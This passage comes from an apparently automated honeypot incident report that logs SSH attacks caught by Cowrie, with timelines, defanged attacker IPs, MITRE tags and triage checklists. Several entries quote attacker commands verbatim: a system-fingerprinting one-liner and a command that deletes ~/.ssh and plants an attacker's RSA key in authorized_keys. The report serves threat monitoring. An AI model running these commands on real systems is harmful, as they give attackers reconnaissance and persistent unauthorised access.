**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:07:36` | `cowrie.session.connect` |
| `2026-03-15 05:07:36` | `cowrie.client.version` |
| `2026-03-15 05:07:36` | `cowrie.client.kex` |
| `2026-03-15 05:07:37` | `cowrie.login.success` |
| `2026-03-15 05:07:38` | `cowrie.session.params` |
| `2026-03-15 05:07:38` | `cowrie.command.input` |
| `2026-03-15 05:07:38` | `cowrie.command.failed` |
| `2026-03-15 05:07:38` | `cowrie.log.closed` |
| `2026-03-15 05:07:39` | `cowrie.session.params` |
| `2026-03-15 05:07:39` | `cowrie.command.input` |
| `2026-03-15 05:07:39` | `cowrie.session.file_download` |
| `2026-03-15 05:07:39` | `cowrie.log.closed` |
| `2026-03-15 05:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]37` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4877db00774

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]37` |
| **First Seen** | 2026-03-15 05:07 |
| **Last Seen** | 2026-03-15 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 05:07:43` | `cowrie.session.connect` |
| `2026-03-15 05:07:43` | `cowrie.client.version` |
| `2026-03-15 05:07:43` | `cowrie.client.kex` |
| `2026-03-15 05:07:45` | `cowrie.login.success` |
| `2026-03-15 05:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]37` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feca4f517438

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 06:26 |
| **Last Seen** | 2026-03-15 06:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 06:26:50` | `cowrie.session.connect` |
| `2026-03-15 06:26:51` | `cowrie.client.version` |
| `2026-03-15 06:26:51` | `cowrie.client.kex` |
| `2026-03-15 06:26:54` | `cowrie.login.success` |
| `2026-03-15 06:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8cc14025a98

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 06:41 |
| **Last Seen** | 2026-03-15 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 06:41:07` | `cowrie.session.connect` |
| `2026-03-15 06:41:07` | `cowrie.client.version` |
| `2026-03-15 06:41:07` | `cowrie.client.kex` |
| `2026-03-15 06:41:08` | `cowrie.login.success` |
| `2026-03-15 06:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02aa2dac191

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 06:55 |
| **Last Seen** | 2026-03-15 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 06:55:29` | `cowrie.session.connect` |
| `2026-03-15 06:55:29` | `cowrie.client.version` |
| `2026-03-15 06:55:29` | `cowrie.client.kex` |
| `2026-03-15 06:55:30` | `cowrie.login.success` |
| `2026-03-15 06:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09a7f063f09

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 07:39 |
| **Last Seen** | 2026-03-15 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 07:39:12` | `cowrie.session.connect` |
| `2026-03-15 07:39:12` | `cowrie.client.version` |
| `2026-03-15 07:39:12` | `cowrie.client.kex` |
| `2026-03-15 07:39:13` | `cowrie.login.success` |
| `2026-03-15 07:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348a22bee8e7

| Field | Detail |
|---|---|
| **Source IP** | `161.35.170[.]148` |
| **First Seen** | 2026-03-15 07:48 |
| **Last Seen** | 2026-03-15 07:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 07:48:27` | `cowrie.session.connect` |
| `2026-03-15 07:48:27` | `cowrie.client.version` |
| `2026-03-15 07:48:27` | `cowrie.client.kex` |
| `2026-03-15 07:48:29` | `cowrie.login.success` |
| `2026-03-15 07:48:31` | `cowrie.session.params` |
| `2026-03-15 07:48:31` | `cowrie.command.input` |
| `2026-03-15 07:48:31` | `cowrie.command.input` |
| `2026-03-15 07:48:31` | `cowrie.command.input` |
| `2026-03-15 07:48:31` | `cowrie.command.input` |
| `2026-03-15 07:48:31` | `cowrie.log.closed` |
| `2026-03-15 07:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.170[.]148` to AbuseIPDB if not already reported
- [ ] Block `161.35.170[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-704ca55293e7

| Field | Detail |
|---|---|
| **Source IP** | `161.35.170[.]148` |
| **First Seen** | 2026-03-15 07:49 |
| **Last Seen** | 2026-03-15 07:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 07:49:29` | `cowrie.session.connect` |
| `2026-03-15 07:49:29` | `cowrie.client.version` |
| `2026-03-15 07:49:29` | `cowrie.client.kex` |
| `2026-03-15 07:49:32` | `cowrie.login.success` |
| `2026-03-15 07:49:33` | `cowrie.session.params` |
| `2026-03-15 07:49:33` | `cowrie.command.input` |
| `2026-03-15 07:49:33` | `cowrie.command.input` |
| `2026-03-15 07:49:33` | `cowrie.command.input` |
| `2026-03-15 07:49:33` | `cowrie.command.input` |
| `2026-03-15 07:49:33` | `cowrie.log.closed` |
| `2026-03-15 07:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.170[.]148` to AbuseIPDB if not already reported
- [ ] Block `161.35.170[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-501e7184b07c

| Field | Detail |
|---|---|
| **Source IP** | `161.35.170[.]148` |
| **First Seen** | 2026-03-15 07:51 |
| **Last Seen** | 2026-03-15 07:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 07:51:32` | `cowrie.session.connect` |
| `2026-03-15 07:51:32` | `cowrie.client.version` |
| `2026-03-15 07:51:32` | `cowrie.client.kex` |
| `2026-03-15 07:51:34` | `cowrie.login.success` |
| `2026-03-15 07:51:35` | `cowrie.session.params` |
| `2026-03-15 07:51:35` | `cowrie.command.input` |
| `2026-03-15 07:51:35` | `cowrie.command.input` |
| `2026-03-15 07:51:35` | `cowrie.command.input` |
| `2026-03-15 07:51:35` | `cowrie.command.input` |
| `2026-03-15 07:51:36` | `cowrie.log.closed` |
| `2026-03-15 07:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.170[.]148` to AbuseIPDB if not already reported
- [ ] Block `161.35.170[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abdf83769f42

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 08:08 |
| **Last Seen** | 2026-03-15 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 08:08:39` | `cowrie.session.connect` |
| `2026-03-15 08:08:39` | `cowrie.client.version` |
| `2026-03-15 08:08:39` | `cowrie.client.kex` |
| `2026-03-15 08:08:40` | `cowrie.login.success` |
| `2026-03-15 08:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba8d79c38ac6

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 08:23 |
| **Last Seen** | 2026-03-15 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 08:23:25` | `cowrie.session.connect` |
| `2026-03-15 08:23:25` | `cowrie.client.version` |
| `2026-03-15 08:23:26` | `cowrie.client.kex` |
| `2026-03-15 08:23:26` | `cowrie.login.success` |
| `2026-03-15 08:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8793739c051d

| Field | Detail |
|---|---|
| **Source IP** | `165.22.214[.]235` |
| **First Seen** | 2026-03-15 08:36 |
| **Last Seen** | 2026-03-15 08:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 08:36:02` | `cowrie.session.connect` |
| `2026-03-15 08:36:03` | `cowrie.client.version` |
| `2026-03-15 08:36:03` | `cowrie.client.kex` |
| `2026-03-15 08:36:04` | `cowrie.login.success` |
| `2026-03-15 08:36:05` | `cowrie.session.params` |
| `2026-03-15 08:36:05` | `cowrie.command.input` |
| `2026-03-15 08:36:05` | `cowrie.command.input` |
| `2026-03-15 08:36:05` | `cowrie.command.input` |
| `2026-03-15 08:36:05` | `cowrie.command.input` |
| `2026-03-15 08:36:05` | `cowrie.log.closed` |
| `2026-03-15 08:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.214[.]235` to AbuseIPDB if not already reported
- [ ] Block `165.22.214[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68b6b7a267e6

| Field | Detail |
|---|---|
| **Source IP** | `165.22.214[.]235` |
| **First Seen** | 2026-03-15 08:36 |
| **Last Seen** | 2026-03-15 08:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 08:36:55` | `cowrie.session.connect` |
| `2026-03-15 08:36:55` | `cowrie.client.version` |
| `2026-03-15 08:36:55` | `cowrie.client.kex` |
| `2026-03-15 08:36:56` | `cowrie.login.success` |
| `2026-03-15 08:36:57` | `cowrie.session.params` |
| `2026-03-15 08:36:57` | `cowrie.command.input` |
| `2026-03-15 08:36:57` | `cowrie.command.input` |
| `2026-03-15 08:36:57` | `cowrie.command.input` |
| `2026-03-15 08:36:57` | `cowrie.command.input` |
| `2026-03-15 08:36:58` | `cowrie.log.closed` |
| `2026-03-15 08:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.214[.]235` to AbuseIPDB if not already reported
- [ ] Block `165.22.214[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731d020d8217

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 08:53 |
| **Last Seen** | 2026-03-15 08:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 08:53:00` | `cowrie.session.connect` |
| `2026-03-15 08:53:01` | `cowrie.client.version` |
| `2026-03-15 08:53:01` | `cowrie.client.kex` |
| `2026-03-15 08:53:03` | `cowrie.login.success` |
| `2026-03-15 08:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7251e8d7869

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 09:07 |
| **Last Seen** | 2026-03-15 09:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:07:52` | `cowrie.session.connect` |
| `2026-03-15 09:07:52` | `cowrie.client.version` |
| `2026-03-15 09:07:52` | `cowrie.client.kex` |
| `2026-03-15 09:07:53` | `cowrie.login.success` |
| `2026-03-15 09:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db398b6fb801

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 09:22 |
| **Last Seen** | 2026-03-15 09:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:22:46` | `cowrie.session.connect` |
| `2026-03-15 09:22:46` | `cowrie.client.version` |
| `2026-03-15 09:22:46` | `cowrie.client.kex` |
| `2026-03-15 09:22:47` | `cowrie.login.success` |
| `2026-03-15 09:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd68a3eea13f

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-15 09:26 |
| **Last Seen** | 2026-03-15 09:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:26:54` | `cowrie.session.connect` |
| `2026-03-15 09:26:54` | `cowrie.client.version` |
| `2026-03-15 09:26:54` | `cowrie.client.kex` |
| `2026-03-15 09:26:54` | `cowrie.login.success` |
| `2026-03-15 09:26:54` | `cowrie.session.params` |
| `2026-03-15 09:26:54` | `cowrie.command.input` |
| `2026-03-15 09:26:54` | `cowrie.command.failed` |
| `2026-03-15 09:26:54` | `cowrie.log.closed` |
| `2026-03-15 09:26:55` | `cowrie.session.params` |
| `2026-03-15 09:26:55` | `cowrie.command.input` |
| `2026-03-15 09:26:55` | `cowrie.session.file_download` |
| `2026-03-15 09:26:55` | `cowrie.log.closed` |
| `2026-03-15 09:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a63e316943f2

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-15 09:26 |
| **Last Seen** | 2026-03-15 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:26:57` | `cowrie.session.connect` |
| `2026-03-15 09:26:57` | `cowrie.client.version` |
| `2026-03-15 09:26:57` | `cowrie.client.kex` |
| `2026-03-15 09:26:57` | `cowrie.login.success` |
| `2026-03-15 09:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-382d053a1186

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 09:37 |
| **Last Seen** | 2026-03-15 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:37:45` | `cowrie.session.connect` |
| `2026-03-15 09:37:45` | `cowrie.client.version` |
| `2026-03-15 09:37:46` | `cowrie.client.kex` |
| `2026-03-15 09:37:46` | `cowrie.login.success` |
| `2026-03-15 09:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9416aa4d59

| Field | Detail |
|---|---|
| **Source IP** | `103.95.13[.]221` |
| **First Seen** | 2026-03-15 09:46 |
| **Last Seen** | 2026-03-15 09:47 |
| **Session Duration** | 57s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `pwd` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:46:17` | `cowrie.session.connect` |
| `2026-03-15 09:46:25` | `cowrie.client.version` |
| `2026-03-15 09:46:25` | `cowrie.client.kex` |
| `2026-03-15 09:46:49` | `cowrie.login.success` |
| `2026-03-15 09:47:08` | `cowrie.session.params` |
| `2026-03-15 09:47:08` | `cowrie.command.input` |
| `2026-03-15 09:47:14` | `cowrie.log.closed` |
| `2026-03-15 09:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.95.13[.]221` to AbuseIPDB if not already reported
- [ ] Block `103.95.13[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e5037c20c2

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 09:52 |
| **Last Seen** | 2026-03-15 09:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:52:45` | `cowrie.session.connect` |
| `2026-03-15 09:52:45` | `cowrie.client.version` |
| `2026-03-15 09:52:45` | `cowrie.client.kex` |
| `2026-03-15 09:52:46` | `cowrie.login.success` |
| `2026-03-15 09:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3907e75633

| Field | Detail |
|---|---|
| **Source IP** | `143.244.140[.]97` |
| **First Seen** | 2026-03-15 09:56 |
| **Last Seen** | 2026-03-15 09:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:56:53` | `cowrie.session.connect` |
| `2026-03-15 09:56:53` | `cowrie.client.version` |
| `2026-03-15 09:56:53` | `cowrie.client.kex` |
| `2026-03-15 09:56:54` | `cowrie.login.success` |
| `2026-03-15 09:56:55` | `cowrie.session.params` |
| `2026-03-15 09:56:55` | `cowrie.command.input` |
| `2026-03-15 09:56:55` | `cowrie.command.input` |
| `2026-03-15 09:56:55` | `cowrie.command.input` |
| `2026-03-15 09:56:55` | `cowrie.command.input` |
| `2026-03-15 09:56:55` | `cowrie.log.closed` |
| `2026-03-15 09:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.140[.]97` to AbuseIPDB if not already reported
- [ ] Block `143.244.140[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ca88e3fb48

| Field | Detail |
|---|---|
| **Source IP** | `143.244.140[.]97` |
| **First Seen** | 2026-03-15 09:57 |
| **Last Seen** | 2026-03-15 09:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
